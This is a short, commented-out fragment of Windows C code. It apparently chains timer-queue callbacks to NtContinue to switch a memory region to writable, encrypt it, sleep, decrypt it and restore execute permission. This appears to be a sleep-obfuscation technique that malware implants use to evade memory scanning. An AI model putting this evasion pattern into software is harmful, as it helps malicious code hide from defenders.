//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );

//         WaitForSingleObject( hEvent, INFINITE );
//     }

//     DeleteTimerQueue( hTimerQueue );
// }
